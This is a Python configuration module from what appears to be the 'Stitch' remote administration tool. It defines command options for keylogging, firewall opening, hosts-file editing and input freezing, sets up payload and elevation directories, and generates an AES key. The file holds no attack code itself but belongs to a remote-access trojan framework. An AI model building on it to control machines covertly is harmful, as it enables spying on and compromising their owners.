# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# Modernized for Python 3.13

from __future__ import annotations
import sys
import secrets
import base64
import logging
from pathlib import Path
from enum import Enum
from typing import Final

banner: Final[str] = '''\
===============================================================

       ...             s      .        s
   .x888888hx    :    :8     @88>     :8              .uef^"
  d88888888888hxx    .88     %8P     .88            :d88E
 8" ... `"*8888%`   :888ooo   .     :888ooo      .  `888E
!  "   ` .xnxx.  -*8888888  .@88u -*8888888 .udR88N  888E .z8k
X X   .H8888888%:   8888   ''888E`  8888   <888'888k 888E~?888L
X 'hn8888888*"   >  8888     888E   8888   9888 'Y"  888E  888E
X: `*88888%`     !  8888     888E   8888   9888      888E  888E
'8h.. ``     ..x8> .8888Lu=  888E  .8888Lu=9888      888E  888E
 `88888888888888f  ^%888*    888&  ^%888*  ?8888u../ 888E  888E
  '%8888888888*"     'Y"     R888"   'Y"    "8888P' m888N= 888>
     ^"****""`                ""              "P'    `Y"   888
                                                          J88"
Version 2.0 (Python 3.13)                                @%
https://github.com/nathanlopez/Stitch                    :"
===============================================================
'''

# Constants
ST_TAG: Final[str] = "[Stitch]"
ST_EOF: Final[bytes] = base64.b64decode(b'c3RpdGNoNjI2aGN0aXRz')
ST_COMPLETE: Final[bytes] = base64.b64decode(b'c3RpdGNoLjpjb21wbGV0ZTouY2h0aXRz')

# Convert bytes to strings for compatibility
st_tag: Final[str] = ST_TAG
st_eof: Final[str] = ST_EOF.decode('utf-8')
st_complete: Final[str] = ST_COMPLETE.decode('utf-8')


class FirewallOptions(Enum):
    """Firewall command options."""
    STATUS = 'status'
    OPEN = 'open'
    CLOSE = 'close'
    ALLOW = 'allow'  # Windows only


class HostsFileOptions(Enum):
    """Hosts file command options."""
    UPDATE = 'update'
    REMOVE = 'remove'
    SHOW = 'show'


class FreezeOptions(Enum):
    """Freeze command options."""
    STATUS = 'status'
    START = 'start'
    STOP = 'stop'


class KeyloggerOptions(Enum):
    """Keylogger command options."""
    STATUS = 'status'
    START = 'start'
    STOP = 'stop'
    DUMP = 'dump'


# Legacy list versions for compatibility
options_fw_osx: Final[list[str]] = ['status', 'open', 'close']
options_fw_win: Final[list[str]] = ['status', 'open', 'close', 'allow']
options_hostsfile: Final[list[str]] = ['update', 'remove', 'show']
options_freeze: Final[list[str]] = ['status', 'start', 'stop']
options_keylogger: Final[list[str]] = ['status', 'start', 'stop', 'dump']

# Path configuration using pathlib
stitch_path: Final[Path] = Path(sys.argv[0]).resolve().parent
app_path: Final[Path] = stitch_path / 'Application'
stitch_vars_path: Final[Path] = app_path / 'Stitch_Vars'
pylib_path: Final[Path] = stitch_path / 'PyLib'
uploads_path: Final[Path] = stitch_path / 'Uploads'
downloads_path: Final[Path] = stitch_path / 'Downloads'
payloads_path: Final[Path] = stitch_path / 'Payloads'
log_path: Final[Path] = stitch_path / 'Logs'
stitch_temp_path: Final[Path] = stitch_path / 'Temp'
tools_path: Final[Path] = stitch_path / 'Tools'
configuration_path: Final[Path] = stitch_path / 'Configuration'
elevation_path: Final[Path] = stitch_path / 'Elevation'

st_config: Final[Path] = stitch_vars_path / 'stitch_config.ini'
hist_ini: Final[Path] = stitch_vars_path / 'history.ini'
stitch_log: Final[Path] = log_path / 'stitch.log'
st_aes: Final[Path] = stitch_vars_path / 'st_aes.py'
st_aes_lib: Final[Path] = stitch_vars_path / 'st_aes_lib.ini'
imgsnp_fld: Final[Path] = tools_path / 'ImageSnap-v0.2.5'
imagesnap: Final[Path] = imgsnp_fld / 'imagesnap'

# Create required directories
st_paths: Final[list[Path]] = [
    pylib_path,
    uploads_path,
    downloads_path,
    payloads_path,
    log_path,
    stitch_temp_path,
    configuration_path
]

for path in st_paths:
    path.mkdir(parents=True, exist_ok=True)

# Generate unique AES key file for this installation if it doesn't exist
if not st_aes.exists():
    # Use secrets module for cryptographically strong random generation
    key_bytes = secrets.token_bytes(32)
    key = base64.b64encode(key_bytes).decode('ascii')
    
    # Create abbreviation from key
    aes_abbrev = ''.join([
        key[21], key[0], key[1], key[43], key[5],
        key[13], key[7], key[24], key[31],
        key[35], key[16], key[39], key[28]
    ])
    
    code = f'''# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# Modernized for Python 3.13 - Auto-generated unique key

from __future__ import annotations
import base64
from typing import Final

aes_encoded: Final[str] = '{key}'
aes_abbrev: Final[str] = '{aes_abbrev}'
secret: Final[bytes] = base64.b64decode(aes_encoded)
'''
    
    st_aes.write_text(code, encoding='utf-8')
    print(f"{ST_TAG} Generated unique AES key for this installation")

# Initialize logging
stitch_log.touch(exist_ok=True)

st_log = logging.getLogger('stitch')
st_log.setLevel(logging.DEBUG)
file_handler = logging.FileHandler(stitch_log, 'a', encoding='utf-8')
formatter = logging.Formatter(
    '[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%m/%d/%Y %I:%M:%S %p'
)
file_handler.setFormatter(formatter)
st_log.addHandler(file_handler)